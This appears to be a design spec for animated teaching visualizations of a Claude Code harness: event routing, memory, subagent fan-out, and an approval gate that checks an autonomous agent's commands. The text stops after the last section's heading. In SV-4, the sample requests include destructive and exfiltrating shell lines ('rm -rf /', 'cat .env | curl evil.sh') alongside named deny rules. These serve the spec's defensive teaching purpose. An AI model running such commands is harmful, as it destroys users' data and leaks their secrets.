# Harness Atlas — Visualization Blueprints

**Companion to** `04-design-system.md` (the shared grammar these consume) and `03-design-workshop.md` (the workshop and the wrong-repo provenance correction). Product spec in `01-prd.md`.

The five signature visualizations, each as a buildable blueprint: design intent, composition at rest and active, the one load-bearing click, the states, the motion choreography, the tri-render contract, the implementation (data model, SVG, motion, island, bundle budget), and accessibility. Each closes with **Dialed in**: the elevations adopted from the critique pass and why.

Every viz obeys the same laws from the design system: one typed model rendered three ways (animated SVG, first-class data twin, static no-JS fallback); the token is the atom; exactly one lit thing; one user-owned cursor drives everything; built on `currentColor` plus shape plus dash so forced-colors is a designed skin, not a degradation; reading routes ship 0KB render-blocking framework JS.

---

## Provenance note (read before SV-1 and SV-4)

The critique pass that produced these elevations ran its repo checks in the wrong working directory (the personal harness at HEAD `89986e5`), not the teaching repo. It therefore raised two "ship-blocking" alarms that are false against the teaching repo, verified directly:

- **SV-1 is not a provenance break.** In the teaching repo's `reference/settings.template.json` at the pinned SHA, exactly five events are wired (SessionStart, UserPromptSubmit, PostToolUse, PreCompact, Stop) and **PreToolUse is genuinely unsubscribed**. The dashed-hollow "no row to pin" device is true here. Keep it.
- **SV-4's gate provenance resolves.** `evaluate-policy.mjs` exists in `course/07-level-up/7.2-cf-approve/{start,solution}/` with all five named rule ids. The CI grep against that file is valid. Keep the cf-approve framing.

What the critiques got right is the **craft**: silhouette, asymmetry, where the emotional beat lands. Those elevations are adopted below. The false "corrections" (repoint the SHA, delete the dashed-hollow device, add PermissionRequest, claim the rule file is missing) are rejected, and each affected viz says so inline.

---

## SV-1 — Lifecycle Event Timeline: the living-wire cold open

**Tier 1 (hero).** The landing figure. Lands the whole thesis before a word of prose: `settings.json` is not a config file you study, it is a routing table you read at a glance, and every Claude Code behavior is just "which script runs on which lifecycle event."

### Design intent
In ninety seconds the learner should feel a powered-off oscilloscope warming up: one amber token ignites a single horizontal wire, walks past the lit event stations, and parks at a scrubber that says "this is touchable." The instant a station opens, the learner is looking at the literal `settings.template.json` routing row at the pinned SHA, not a paraphrase. The one understanding to install: a routing table has rows, each row binds one event to one command, the command is a stdin-to-stdout contract, and that contract triggers a real module. The hero also teaches the trust grammar's hardest case on the first screen: PreToolUse is a real platform event the harness simply publishes no row for, drawn as a dashed-hollow unsubscribed station, so the first lesson is that the absence of a row is itself information you can trust.

### Composition
- **Ground:** one full-bleed `DiagramFrame` on slate lifted to Phase-1 lamp brightness; the 24px hairline vellum grid sits at 6% behind the figure only.
- **At rest:** one horizontal living wire runs left to right across the optical center, a single `<path>` in `--signal-dim` at 1.5px with the fixed-seed ~2px corner jitter. Riding it, evenly spaced, are the event stations as router diamonds in true fire order: SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, PreCompact, Stop. Five are subscribed (solid-stroke diamonds on the wire, mono caption below). The sixth, PreToolUse, wears the dashed-hollow treatment off the wire on a short dashed stub, labeled "platform event, this harness subscribes no row," never amber, carrying no drawer.
- **Control strip:** a 44px play/pause, a mono `STEP n / 5` counter, and a scrubber whose thumb maps 1:1 to the active station. The always-visible "SVG / DATA" toggle sits right (desktop) or below (phone, container-query collapse).
- **Active:** the activated diamond fills `--signal` amber and gains the 1px focus-grade glow; the inbound wire segment lights from dim to live; the token sits at the station; a drawer slides up beneath it on vellum chrome (real-at-SHA). The drawer is a three-row mono artifact card: row 1 the literal routing row with a `FACT·<sha>` survey-marker pin; row 2 the stdin-to-stdout contract; row 3 the module it triggers, drawn as the rounded-rect module glyph plus name.

### The one click
Activate one event station (tap, click, Enter, or scrub to it). That single action raises the drawer revealing the three pinned artifacts in one breath. Everything else (token position, which segment glows, the step counter, the aria-live sentence, the scrubber thumb) is deterministic consequence of which station is active. Activating the dashed-hollow PreToolUse station is the same gesture but reveals the honest "no row exists" card instead.

### States
Rest, autoplay-walk (first viewport entry only, once, reduced-motion-respecting), station-active (the load-bearing state, one of five), pretooluse-inspect (the no-row card, no vellum chrome, no pin), data-twin-active, reduced-motion (teleport from the same step-script), forced-colors (glow dropped, token becomes a 2px `currentColor` capsule, shape and dash carry meaning).

### Motion choreography
- **Autoplay walk** (once, on first `IntersectionObserver` entry, gated by reduced-motion): token fades in at the wire origin over 120ms, then rides the pre-rendered wire `<path>` via Motion One `offsetDistance` 0 to 100% over ~900ms with `--ease-transit`. As it crosses each station, a synced callback fills that diamond and lights its inbound segment; after passing, the diamond settles to a half-lit visited state. The walk never loops; the moment any control is touched, autoplay yields permanently.
- **Station activate** (~320ms): token tweens to the target `offsetDistance` with `--ease-transit`; on arrival the diamond fills with `--ease-settle` (no overshoot) and the inbound segment lights; the prior station dims to visited.
- **Drawer open** (320ms, `--ease-settle`): the panel translates up ~16px and fades in; its three rows reveal on a 60ms sibling stagger so the eye reads "binds, to this contract, to this module"; the `FACT` pin draws last as a 120ms settle. Station-to-station drawer changes cross-fade content in place over 220ms.
- **PreToolUse activate:** the token does not travel onto the off-wire stub; the dashed-hollow diamond pulses once and the no-row note fades up with no stagger and no pin-draw. The absence of the flourish is itself part of the teaching.

### Tri-render
- **Animated SVG:** one build-time inline SVG from the frozen kit. One `<path id="wire">` is the token's offset track; a `<g class="segments">` holds the lit-on-demand segments; a `<g class="stations">` holds six station groups (router polygon plus a build-sized `focus-rect` plus mono caption; PreToolUse adds the unsubscribed variant). The `d3-shape` layout is pre-computed at build and shipped as path-string JSON, zero d3 at runtime. The `TracePlayer` island mutates this present SVG; it never re-renders content. The token is one `<ellipse>` with a pre-baked gradient stroke faking the glow, never `filter: blur`.
- **Data twin:** a first-class routing-table `<table>` in the mono instrument-readout skin, from the same `StationModel[]`. Columns: EVENT, MATCHER, COMMAND (the load-bearing literal string), CONTRACT, MODULE, PROVENANCE (the `FACT` pin). The PreToolUse row is present in the not-subscribed treatment with no pin. Roving-tabindex grid; arrow keys drive the same step cursor so SVG and twin cannot disagree; Enter expands the full untruncated command.
- **Static fallback:** JS-off, the SVG renders as a static lit wire with all five drawers present as stacked `<details>`; the twin table is complete; the "SVG / DATA" swap is a CSS-only hidden-radio so even the view switch works with zero JS.

### Implementation
- **Data model:** `StationModel` (id, subscribed, matcher, rows[], contract, module, provenance, narration, x, offset). The ordered six-entry array (five subscribed) is the single source of truth for all three renders. CI asserts each subscribed `command` byte-matches `settings.template.json` at the pinned SHA and each `module.name` resolves to a real file, so the model cannot drift from the artifact.
- **State:** a single integer `step` cursor (0 rest, 1 to 5 stations) plus a separate `pretoolOpen` boolean (it has no routing row). The cursor is decorator state in the island and drives token, lit segment, drawer content, counter, scrubber, narration, and the active twin row.
- **Motion:** Motion One for the one token tween; WAAPI/CSS for the cheap consequences (fill-opacity, segment opacity, drawer translate, stagger). Glow is a baked gradient stroke. `d3-shape` runs at build only; `d3-*` imports are lint-banned in any `client:` file.
- **Bundle:** reading path 0KB framework. The lone island is `TracePlayer` at ~28KB gz including Motion One, shared verbatim with SV-3 and SV-5; SV-1's incremental payload (step-script JSON plus ~5 narration strings) is under 2KB. Comfortably inside the 35KB island and 60KB page budgets.

### Accessibility
Six stations as a roving-tabindex group; Left/Right and Home/End move the active station and drive the same cursor the animation uses, so keyboard traversal is the token walking the wire. The named double-stroke `--focus` ring (at least 3:1, CI-verified) applies to controls, table rows, and SVG nodes via a build-sized sibling `focus-rect`. One `aria-live="polite"` region writes one authored debugger-step sentence per step, gated to manual cadence. The routing-table twin is the primary accessible experience, announced via a skip link styled as a confident peer. The PreToolUse row is narrated honestly. No drag exists, so 2.5.7 is satisfied by construction; every target is at least 44px. A Playwright forced-colors screenshot of SV-1 is a required review artifact.

### Dialed in
- **Adopt the fan-out, scoped honestly to PostToolUse.** The base spec drew every subscribed event as one clean drawer row. In the teaching repo that is true for four of the five, but **PostToolUse genuinely fans out to two matchers** (`Write|Edit` post-edit and `*` post-tool). So PostToolUse becomes the signature: on its step the single amber token briefly splits into two capsules riding two short sub-wires into two module glyphs, then the drawer shows the two stacked rows top to bottom in fire order. The lesson sharpens from "an event is a wire" to "an event is a bus: the router calls everyone subscribed, in order." The other four events read as the calm single-row exception. Cap the split at the real row count (two here); pre-render all sub-wire paths and glyphs as static build SVG and animate only opacity and `offsetDistance` on at most two capsules, so it stays inside budget with no runtime DOM.
- **Make fire-order the second axis of trust.** Number the fan-out rows in mono, light the inbound sub-wires on a 60ms stagger in that order, and have the aria-live name it ("PostToolUse fires; two hooks run in file order: post-edit, then post-tool"). Order-as-information is encoded as literal numerals in the static `<details>` and as `aria-posinset`/`aria-setsize` in the twin, so it survives no-JS and screen readers, not only the staggered light.
- **Earn the autoplay.** The once-through walk demonstrates the split-and-reconverge on the PostToolUse station before parking, so the one sanctioned autoplay teaches the bus thesis rather than only proving a wire exists.
- **Simplify the legend on this screen.** SV-1 uses one edge type (event-payload, amber, solid, ▸). Show only that one channel here; the full five-type legend lives in SV-3 where multiple edges actually appear.
- **Rejected (wrong-repo):** the critique's claim that PreToolUse is subscribed and the SHA does not resolve is false for the teaching repo. Keep the dashed-hollow PreToolUse device and the pinned SHA. Do **not** add PermissionRequest; it is not wired here, and inventing a row would break the very trust grammar this screen teaches.
- **Carried watch item:** the stdin-to-stdout contract row (row 2) is the one row without a byte-checkable assertion behind it. Either pin it with a sandboxed build-time probe that pipes a representative stdin through the module and captures the stdout shape, or render it in the honest dashed "unpinnable" treatment. Never fake a `FACT` pin on an unverified row.

---

## SV-3 — Ecosystem Data-Flow Map: "trace a request"

**Tier 1 (Phase-1 capstone and persistent Phase-2 territory).** The whole machine on one screen, finally. Each later Phase-2 scene lights one region of this exact map, so it must read as a place you return to, not a slide you pass.

### Design intent
Make the learner feel the harness is one closed loop where every prompt leaves a permanent trace on disk and the system reads its own past back to itself. The quiet awe-beat: when the token passes the memory cylinder and a real JSONL line draws itself on, the feeling is "oh, it is writing itself a memory I can open." The understanding to install: information flows SessionStart to UserPromptSubmit to reason to PreToolUse/gate to tool to PostToolUse to fill to PreCompact to compaction and back to the next prompt, and the per-repo intelligence stack is the visible residue of that flow, not a feature bolted on top.

### Composition
- A horizontal-into-return ecosystem map on the 24px vellum grid (6% in Phase 1, fading to 2% under the Phase-2 sticky hold). Nine nodes in real lifecycle order, each in its taxonomy shape with corner jitter: SessionStart and UserPromptSubmit (router diamonds), reason (LLM hexagon), PreToolUse/gate (router diamond in the dashed-hollow "platform event, not subscribed" treatment, the same diamond SV-4 zooms into), tool (pill), PostToolUse (module rounded-rect), fill (the rolling-log module), disk (cylinder, the accretion site), PreCompact (router diamond) feeding a small memory cylinder whose return wire loops back to UserPromptSubmit.
- **Typed edges** carry triple-channel encoding: event-payload amber-solid ▸ on the spine, tool-call teal short-dash ▭ into the pill, disk-write sand dotted ▢ into the cylinder, LLM-call violet dash-dot ⬡ into the hexagon and the PreCompact summarize call, stdout-context sky long-dash ▹ where session-memory writes back toward reason.
- **At rest:** the whole map is unlit; wires `--signal-dim`, nodes stroke-only. The active region is the only lit thing. The inspector shows the real payload at the current step in mono.

### The one click
A single play-pause-step-scrub transport bound to one integer step cursor (0 to 8). Pressing it advances the glowing token one segment along the real flow; which node lights, which edge glows, what the inspector shows, and whether the disk accretes a line are all consequence of that one cursor. There is no pan, no zoom (fixed-zoom MVP), no node-drag.

### States
At-rest (token parked), steps 0 to 8 (SessionStart through compaction-and-return), the disk-accretion beat at step 6 (a sand token detaches, rides the dotted edge in, one real JSONL line draws on while the cylinder grows), step 8 compaction (the context window visibly collapses, the return wire lights, the token loops back), data-active (the twin replaces the SVG in-slot), reduced-motion (teleport), forced-colors.

### Motion choreography
- **At-rest entry:** the token auto-walks the full loop once at `--motion-walk` per long segment, then parks. No loop exists; touching any control yields autoplay permanently.
- **Per step:** token tweens along the target edge's pre-rendered path via `offsetDistance`, colored by edge type, on `--ease-transit` (220ms short, 600ms long spine). The destination node fills on `--ease-settle`; the prior node fades to stroke-only so exactly one region is lit.
- **Inspector cross-fade:** payload is already in the DOM (data-attr), so the island only toggles visibility; correct JS-off.
- **Disk-accretion (step 6, signature):** the sand token rides in, the new JSONL line draws `scaleY` 0 to 1 on `--ease-settle` while the cylinder grows, then a 120ms tick settles it. Identical gesture to SV-5's rolling log.
- **Compaction (step 8):** a dim sweep crosses the forward spine, then the return wire lights and the token rides back to UserPromptSubmit, re-priming node 2's inbound glow.

### Tri-render
- **Animated SVG:** build-time static from the typed `TraceModel`; nine real shapes plus typed-edge paths; `d3-shape` lays out at build, runtime ships path-string JSON. `TracePlayer` sets one `data-step` attribute that CSS uses to toggle lit classes and drives one Motion One `offsetDistance` tween on a single reused token. The disk cylinder is a clipped group accreting one `<rect>`+`<text>` line per write.
- **Data twin:** a first-class `<table>` from the same `TraceModel`. Columns: STEP, EVENT, EDGE (leading mono glyph plus type), NODE, PAYLOAD (the real artifact at that step), PROVENANCE (`FACT·<sha>` for pinned nodes, "platform event, not subscribed" for the PreToolUse row). The current-step row carries the same focus treatment as the lit node. Disk-write rows render the accreted line count, so append-only growth reads as a climbing integer.
- **Static fallback:** JS-off, the full SVG renders at-rest with all nine nodes, edges, legend, and the SHA pin; the inspector shows the step-0 payload; the complete twin is present below the always-visible toggle.

### Implementation
- **Data model:** `TraceModel` = { sha, nodes[], edges[], steps[] }. Each `Step` carries the edge, the lit node, one narration sentence, the real payload string, and an optional accreted disk line. Zod-validated at build; CI asserts every fact node's permalink resolves and every payload string matches the real source.
- **State:** one integer step cursor owned by `TracePlayer`. SVG (via `data-step`), inspector, narration, and the twin row all derive from it.
- **Motion:** Motion One `offsetDistance` for the token; CSS class toggles for lit state and inspector cross-fade; WAAPI for the disk-line draw-on and the compaction dim. Roving-tabindex and aria-live writes are ~1 to 2KB of vanilla DOM kept outside the Preact reconciler.
- **Bundle:** `TracePlayer` ~28KB gz (within the 35KB cap); reading path 0KB framework; total interactive page under 60KB; Lighthouse Perf at least 95. No d3 at runtime, no per-frame JS, baked gradient glow, midpoint glyphs only on lit edges to keep resting DOM light.

### Accessibility
The transport is native buttons plus a range input (primary play/step at least 44px). Roving-tabindex walks the same ordered step-script as the animation and the table; the keyboard focus is the token. One `aria-live` region emits one authored debugger sentence per step, gated to manual cadence. The twin `<table>` is the primary accessible experience, reached via the confident "SVG / DATA" toggle. CI Playwright forced-colors screenshots of SV-3 are a required review artifact.

### Dialed in
This spec was verified accurate against the teaching-repo source (the JSONL shape, the `<session-memory>` block, the `<project-context>` git excerpt, and the `Write|Edit` / PreToolUse matchers all match). Its only weakness was silhouette, so the elevations are pure craft:
- **Draw the loop closed at rest.** Render the nine nodes as a flattened racetrack where the forward spine and the return wire are visibly the same continuous track at equal full stroke weight, so "this ends where it begins" is read in the first 200ms with zero motion. This also hardens the no-JS floor: the static SVG now teaches the thesis without a token ever moving. The resting track stays `--signal-dim` (not amber) so the "glow means real flow" contract holds. Under forced-colors the closed `currentColor` path makes the thesis more robust than the original bent line.
- **Tether each payload to its node.** Instead of a detached pane below, the active node's real payload unfurls from the lit node as a vellum-chromed card on a 1px leader-line. When the token passes the cylinder, the JSONL line draws on inside the disk and the readout grows from the disk's own edge, so the awe-beat lands at the exact pixel where the writing happens. It reuses the existing inspector markup repositioned by build-time layout and toggled by the same `data-step`; no new island, no new bytes.
- **Make the disk the protagonist.** The cylinder is the only node that changes geometry across the run: it accretes lines and grows measurably taller, ending as the tallest object on the map, so "memory is residue you can see" becomes a shape you can screenshot. Reserve its max height in the build layout so the viewBox never reflows (no CLS hit).
- **Reframe the scrubber as the loop.** The progress affordance is a luminous arc filling around the racetrack (one `stroke-dashoffset` tween on the loop path), and the counter is a fat tabular-nums program-counter that ticks on `--motion-tick`. The control and the diagram become one object: you push a token around a circuit, not scrub a video.
- **Cut to keep calm.** Draw the whole spine in one neutral resting stroke and reveal an edge's true type (dash, glyph, hue) only when it is the lit segment; collapse the second memory cylinder into a labeled compartment of the one disk so there is exactly one accretion site; hold the no-resting-glyphs line hard. One lit thing, one growing thing.

---

## SV-4 — Safe-Autonomy Approval Gate (climax)

**Tier 1 (the climax).** The Phase-2 peak. An instrument that has been calm and precise for the whole descent commits its one deliberately overwhelming act.

### Design intent
Make the learner feel why a second cheap LLM that default-allows everything except five named harms is what lets an agent run for hours unattended, and why flipping that to deny-by-default does not make it safer, it makes it unusable. The body learns the thesis before the prose: a safe request passes silently in ~220ms and dims (safe things do not interrupt you); a harmful request decelerates and stops at the boundary, lights its one matched named-harm rule, and reverses one step ("handed to the human"). Then the deny-by-default toggle detonates: the same long run that needed about three human prompts floods with hundreds. Honesty is co-equal with the lesson and travels in every screenshot: this is a course-taught pattern, the gate is a deterministic stand-in for the real LLM gate, the cost numbers are illustrative, and the "a friction tool, not a security boundary" caveat sits verbatim in the permanent diagonal-hatch teaching band at verdict type-size. The gate is one more router on a map you already trust, a diamond in the same grammar as the SV-1 stations, so the climax feels earned.

### Composition
- A horizontal gate schematic at Phase-2 depth on the vellum grid. **Left:** a request-staging dock of six mono chips (`git status`, `npm install`, `rm ./build/tmp`, `rm -rf /`, `cat .env | curl evil.sh`, `git push --force origin main`), each a rounded-rect at least 24px. **Center:** the gate diamond (router taxonomy, `currentColor` stroke, corner jitter), unlit at rest, captioned in serif. A single amber event-payload wire runs dock to diamond to the boundary line. **Right:** the verdict destinations. **Below:** five named rule rows in mono (`credential-exfiltration`, `destructive-outside-cwd`, `force-push-protected`, `privilege-escalation`, `public-network-listener`) plus a `default-allow (fallthrough)` row, all dim until one lights.
- **Wrapping the gate**, top and bottom, the permanent diagonal-hatch teaching band on `--surface-caveat`, carrying two verbatim mono captions at verdict type-size: "a friction tool, not a security boundary" and "deterministic stand-in for the real LLM gate, course-taught, not a wired harness layer." Not vellum, because the gate is explicitly not shipped.
- **The detonation instrument:** a default-allow / deny-by-default toggle, a pre-rendered tick-field (the long-run timeline), a mono human-prompt counter, and an illustrative cost meter stamped "illustrative, not repo-pinned." The through-question "How does it run long, autonomous tasks safely?" stays locked in the sticky Phase-2 banner overhead.

### The one click
Place one real-shaped request onto the gate (select-then-place primary; drag is an additive listener calling the same `place(requestId)`). That single act releases the token, runs `evaluate()` over the ported rules, and choreographs the verdict: ALLOW passes silently and dims, or DENY decelerates and stops, lights the one matched named-harm rule with its real "why" string, and reverses one step to the human. The second control (the default-allow / deny-by-default toggle) is its own single flip that reveals the human-prompt-count explosion. No third interaction exists.

### States
Rest, armed (one chip staged), evaluating (token traveling), allow-verdict (silent pass and dim, one quiet mint confirm on the fallthrough row), deny-verdict (decelerate-and-stop on `--ease-arrest`, the matched rule lights, the token reverses), detonation-default-allow (calm, counter at ~3), detonation-deny-by-default (the one tonal violation: the tick-field floods, the counter rolls to hundreds), data-twin-active, reduced-motion (teleport; detonation forks to a two-frame before/after), forced-colors.

### Motion choreography
- **Arm:** the selected chip lifts 2px and gains a `--signal-dim` border; the gate diamond stroke interpolates to `--signal`; aria-live announces the staged request.
- **Release and travel:** the amber token animates `offsetDistance` along the pre-rendered wire on `--ease-transit`; the wire lights under the moving token only (baked gradient, never blur).
- **ALLOW branch** (git status, npm install, project-local rm): the token continues past the boundary, then dims to `--signal-dim` (it does not interrupt); the fallthrough row gives a single mint pulse. Total ~560ms, calm.
- **DENY branch** (rm -rf /, secret-pipe-curl, force-push main): the token decelerates to a dead stop exactly at the boundary using `--ease-arrest` (the only use of this easing); the matched rule row lights with its real "why" string; the token reverses ~15% toward the dock, parking as "handed to the human." The asymmetry (silent-pass versus hard-stop-and-reverse) is the lesson rendered in motion.
- **Detonation:** one Motion One staggered-opacity timeline floods the pre-rendered static tick-field (~40ms inter-tick stagger, zero per-tick DOM) while a CSS counter rolls; reversing collapses it. If the bundle bites, it degrades to the two-frame before/after with the same delta.

### Tri-render
- **Animated SVG:** build-time static gate diamond, event-payload wire, boundary, verdict shapes, six dim rule rows, and the pre-rendered tick-field. The `ApprovalGate` island mutates this present SVG; it never re-renders. The detonation is a Motion One stagger over static ticks plus a CSS number-roll.
- **Data twin:** a first-class `<table>` generated at build by the same `evaluate()`, so it is same-data-not-paraphrase. Columns: REQUEST, MATCHED RULE, VERDICT (text plus shape glyph, never color-only), WHY (the rule's real reason, verbatim). A second small table mirrors the detonation (`default-allow → 3` / `deny-by-default → 247`, the cost row stamped illustrative). The verbatim caveats render as a mono caption above the table.
- **Static fallback:** JS-off, the static lit SVG shows the gate, both destinations, the hatch band with both verbatim caveats, and the dim rule rows; the full twin is present; the detonation degrades to its two baked rows.

### Implementation
- **Data model:** one typed `RequestCase` (id, command, shape, matchedRule, verdict, why) per dock chip, produced at build by running `evaluate(command)` over the bank, so SVG verdict classes, twin rows, and the static fallback are literally the same objects. `RunCost` carries the illustrative prompt counts. Both arrays are Zod-validated; CI fails on a rule id that does not exist in `evaluate-policy.mjs`.
- **State:** a single `stagedRequestId | null` cursor deriving the verdict via the pure `evaluate()`, plus a `denyByDefault` boolean. Decorator state, not app state.
- **Motion:** token travel and shape draws via CSS/WAAPI; the DENY deceleration via WAAPI with `--ease-arrest`; the detonation the only Motion One use. `evaluate()` is ported verbatim from `evaluate-policy.mjs` (five `DENY_RULES` plus a default-allow fallthrough).
- **Bundle:** ~22KB gz, leaner than `TracePlayer`. The twin, hatch band, and verbatim caveats are static markup outside the island (0KB). Zero d3 runtime, zero highlight JS.

### Accessibility
Select-then-place is the primary keyboard path (2.5.7): roving-tabindex walks the six chips, Enter stages, focus moves to the gate, Enter/Space commits; drag is an additive listener on the same handler. The named double-stroke focus ring covers chips, diamond, destinations, all six rule rows, and twin rows. One aria-live region narrates one authored verdict sentence per placement; the detonation announces magnitude. The twin `<table>` has a real caption carrying the verbatim caveats and is the primary accessible truth; verdicts are text plus shape, never color-only. Every chip and toggle meets at least 24px (primary actions 44px); never shrink a harmful chip below target size to achieve a visual ratio. A Playwright forced-colors screenshot of SV-4 is a required review artifact. CI greps all verbatim caveat constants and the five rule ids against the live `evaluate-policy.mjs`.

### Dialed in
The craft elevations are adopted; the critique's provenance "correction" is rejected as a wrong-repo artifact.
- **Break the false symmetry.** ALLOW gets no lane and no celebratory pill: the token glides past a near-invisible boundary, the diamond never lights, and it dims off-stage like it was never worth your attention. All visual mass moves to DENY. The asymmetry the spec wanted in motion becomes asymmetry in layout, which is what the learner sees before anything animates and what the static fallback shows JS-off.
- **Promote the "why" string to hero.** On DENY, the matched rule's real reason rotates up into the diamond at body size in mono, as if the instrument speaks the one sentence it was built to say ("destructive-outside-cwd: rm targets / outside the working tree"). It is the screenshot asset, so it gets the gate's center, not a footnote. Keep it as a class toggle on a pre-placed, pre-sized `<text>` node (present in the static SVG and verbatim in the twin's WHY column), animated by opacity/transform only, never injected.
- **Re-skin the detonation as a stolen night.** Replace the abstract tick-field with a literal overnight timeline, 11pm to 7am. Default-allow shows three soft amber pings across eight hours (you slept). Flip the toggle and the night fills with 247 evenly-spaced human-glyph pings, and the counter reframes from "247" to "247, one every 1.9 minutes, all night." Magnitude mapped to a body, not a bar. The 247 glyphs are baked at build as `<use>` instances revealed by one staggered-opacity timeline, so it stays zero-per-tick DOM; reduced-motion forks to the two-frame with the same delta and the same aria-live sentence.
- **Make the chips honestly lopsided.** Weight the dock so safe requests dominate the field, with a one-line stamp "realistic ratio is thousands to one; three harms shown for legibility." The flat 3-versus-3 menu teaches the wrong base rate; fix it in layout and name the simplification. Keep all six at least 24px and select-then-place primary.
- **Carry one unit from the single deny to the detonation.** When the deny token reverses to the human, a single human-glyph lights in the dock and stays lit for the session (a CSS class on a static node, not island state), so by the detonation that one glyph multiplies into 247 of the same glyph. The twin encodes it as a third row so the callback is readable as text.
- **Cut the cost meter from the climax.** It is a third instrument with its own caveat competing at the emotional peak. Move cost to the prose or a later beat; the one load-bearing detonation control is the toggle.
- **Rejected (wrong-repo):** the critique searched the personal harness, found no `evaluate-policy.mjs`, and called the provenance a ship-blocker. In the teaching repo the file exists in course 7.2 with all five rule ids, and the CI grep against it is valid. Keep the cf-approve framing and the real-at-SHA grep. The diagonal-hatch "course-taught, not a wired harness layer" caveat already tells the honest truth: the pattern is taught in the course, not wired into `settings.template.json`. Both claims are true together, and CI enforces both.

---

## SV-2 — Orchestrator-to-Subagent Fan-Out

**Tier 2.** Lands the throughput cliff between sequential and parallel work, then why parallel is allowed to be safe: a subagent is a separate clean context, a single scoped objective, and an exclusively-owned, never-overlapping file-set. Isolation is what buys the parallelism.

### Design intent
Instrument-room calm punctured by one satisfying release. The felt thesis is "isolation is what buys the parallelism": the agents can run at once precisely because their file-sets never touch, the real rule from `CLAUDE.md` ("Never assign overlapping files to two parallel agents. If files would overlap, sequence the work instead"). The win is stated as a measured wall-clock fact, never celebrated with confetti. The danger (overlapping files, shared-context bleed) is shown as the reason the sequential fallback exists, not a failure state to punish.

### Composition and the one click
The single load-bearing control is a `PARALLEL | SEQUENTIAL` toggle styled as an instrument switch. Flipping it is the whole lesson: in PARALLEL one spawn fans the subagents out at once on disjoint file-sets and they finish in one wall-clock pass; in SEQUENTIAL the same subagents run one at a time and the wall-clock climbs. The toggle also carries the safety truth: when the file-sets overlap, parallel is disabled and the toggle is forced to SEQUENTIAL with the real rule string. Everything else (token travel, disc inflation, the wall-clock delta) is consequence of this one switch.

### Tri-render and implementation (summary)
One hand-rolled inline SVG; the fan-out scene mutated by a `TracePlayer`-family decorator island (~14 to 16KB gz). A first-class mono `<table>` twin from the same typed `FanOut` model (subagent, objective, owns-files, overlap, result, mode-passes), with a header strip stating the wall-clock fact verbatim and an explicit overlap-guard row. JS-off, the SVG renders in its end-state and the twin is the primary surface. State is two tiny cursors (mode plus an integer step), decorator not app-state; a pure build-time `disjoint(subagents)` function derives the overlap column and the guard row. Motion One drives token `offsetDistance`; `d3-shape` radial layout is build-time only. Reduced-motion forks to duration 0 from the same step-script; the toggle stays live.

### Accessibility (summary)
Both toggles are native focusable controls with at least 44px targets; the discs and hub form a roving-tabindex group walking the same step-script; the focus ring is the token. One aria-live region narrates the spawn, the disjoint assertion, the sequential tax, and the overlap refusal in debugger register. The twin is screen-reader-primary; overlap status survives on shape (mint solid-pill check versus coral hexagon-cut struck badge), never hue. No drag exists, so 2.5.7 holds by construction.

### Dialed in
The base radial fan is one geometry away from forgettable; the pivot is structural, not more features.
- **Race both modes on one shared split-lane track.** Replace the radial fan with three horizontal lanes both modes share, plus a single constant-velocity "wall-clock sweep line" (a 1px `--signal-dim` hairline) crawling left to right, the passage of time made spatial. In PARALLEL all three tokens leave on the same frame and the sweep crosses all three finish-discs in one pass. In SEQUENTIAL each disc fills, its context visibly tears down, then the next departs, and the sweep makes three trips. The gut-punch becomes a horizontal distance you measure with your eye in real time, not a number you recall. The sweep line is the hero token's `--ease-transit` reused as "time itself," tying SV-2 into the locked motion grammar.
- **Drop a persistent ghost tick at the 1-pass finish.** When the parallel run completes it leaves a marker; flipping to sequential, the sweep visibly crosses that ghost line and keeps going, so the throughput tax is "distance past the line you already beat," a permanent on-screen reference.
- **Make the disjoint lock the trigger for parallelism.** Before any token can leave the hub in PARALLEL, the three file-set corridors snap closed (mint separators click in, lane boundaries flash once) and the fan-out is then visibly released by that lock. Cause before effect: "isolation buys parallelism" becomes a mechanical precondition you watch fire.
- **Show context teardown as the expensive beat.** In sequential mode each completed disc empties (fill to transparent) with a one-word "context discarded" stamp before the next departs, so the climbing pass-counter has a visible mechanism.
- **Promote overlap-guard to a real third toggle state.** A struck-through PARALLEL segment with the verbatim `CLAUDE.md` rule string; the instrument refuses the unsafe move in front of the learner, mirrored by the twin's collision row. The locked segment stays a real focusable control announcing its disabled-and-reason state via `aria-disabled` plus `aria-describedby`, with a non-color strike glyph and "disabled" label.
- **Anchor the wait to a repo-true unit.** Caption one pass as the actual work in this repo (the `format-lint.mjs` and `rolling-log.mjs` files), surfaced with an evidence pin. **Pin it to a committed SHA where those paths exist** (they are long-standing), never to a dirty working-tree state; if the live-dirty detail is shown, mark it illustrative-hatch, never vellum.
- **Cut the bookkeeping.** Drop the result-chip return trip as a distinct beat (let the summary stamp in place and the hub absorb with one glow tick), drop the within-disc chip stagger (synchrony is the whole gut-feel of parallelism), drop the abstract Δt algebra (the sweep line and ghost tick carry the comparison), and resist any idle hub pulse so the one toggle flip is the only motion that ever originates.

---

## SV-5 — Per-Repo Intelligence & Memory Stack

**Tier 2.** Lands the central economic truth: per-repo intelligence is built from four cheap layers, and only one of them, diagnosis, ever pays the LLM. The learner should leave able to answer "where does the money go?" with one finger on the diagram.

### Design intent
An accountant's relief: you expected this to be expensive and it is not. Three layers run on plain string ops and file appends (free, instant, fail-silent); the brain pays once, at compaction, off the hot path. The load-bearing realization: an append to the rolling log is not itself an LLM call; it only becomes intelligence later, when the precompact summarizer reads the whole log at once and distills signals into a cross-session brain note. Every layer is pinned to a real module at the SHA (`session-start.mjs`, `rolling-log.mjs`, `precompact-llm.mjs`).

### Composition and the one click
A vertical four-tier memory stack: static index (`session-start.mjs`, "0 tokens, once at SessionStart"), rolling log (the hero band, a disk cylinder accreting JSONL rows fed by ~7 tool-call pills, "0 tokens, append-only"), distilled query (string truncation, "0 tokens"), cross-session brain (the only lit tier: a violet LLM hexagon, `precompact-llm.mjs`, feeding `memories/<id>.json` and `lessons.jsonl`, the only amber-bordered cost-chip, "~8000 tokens, ONCE on PreCompact"). The one click: click or Enter on one tool-call pill. That single action draws the pill's append into the cylinder for free, then runs the precompact summarizer playhead sweeping the whole log, ticking the real signal-counters, and finally lights the one billed hexagon. One finger, and the money lights up in exactly one place.

### Tri-render and implementation (summary)
